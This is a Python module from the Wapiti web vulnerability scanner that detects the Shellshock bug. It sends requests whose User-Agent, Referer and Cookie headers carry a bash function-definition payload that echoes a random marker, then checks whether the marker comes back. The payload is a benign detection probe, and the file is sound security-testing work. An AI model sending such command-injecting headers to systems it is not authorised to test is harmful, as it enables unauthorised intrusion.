#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This file is part of the Wapiti project (https://wapiti.sourceforge.io)
# Copyright (C) 2014-2021 Nicolas Surribas
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
import random
import string
from binascii import hexlify

from httpx import RequestError

from wapitiCore.attack.attack import Attack
from wapitiCore.language.vulnerability import HIGH_LEVEL, _
from wapitiCore.net.web import Request
from wapitiCore.definitions.exec import NAME


class mod_shellshock(Attack):
    """
    Detects scripts vulnerable to the infamous ShellShock vulnerability.
    """

    name = "shellshock"

    do_get = False
    do_post = False

    def __init__(self, crawler, persister, logger, attack_options, stop_event):
        Attack.__init__(self, crawler, persister, logger, attack_options, stop_event)
        empty_func = "() { :;}; "

        self.rand_string = "".join([random.choice(string.hexdigits) for _ in range(32)])
        hex_string = hexlify(self.rand_string.encode())
        bash_string = ""
        for i in range(0, 64, 2):
            bash_string += "\\x" + hex_string[i:i + 2].decode()

        cmd = "echo; echo; echo -e '{0}';".format(bash_string)

        self.hdrs = {
            "user-agent": empty_func + cmd,
            "referer": empty_func + cmd,
            "cookie": empty_func + cmd
        }

    def must_attack(self, request: Request):
        # We attempt to attach each script once whatever the method
        return request.path not in self.attacked_get

    async def attack(self, request: Request):
        url = request.path
        self.attacked_get.append(url)

        # We can't see anything by printing requests because payload is in headers so let's print nothing :)
        evil_req = Request(url)

        try:
            resp = await self.crawler.async_send(evil_req, headers=self.hdrs)
        except RequestError:
            self.network_errors += 1
            return

        if resp:
            data = resp.content
            if self.rand_string in data:
                self.log_red(_("URL {0} seems vulnerable to Shellshock attack!").format(url))

                self.add_vuln(
                    request_id=request.path_id,
                    category=NAME,
                    level=HIGH_LEVEL,
                    request=evil_req,
                    info=_("URL {0} seems vulnerable to Shellshock attack").format(url)
                )
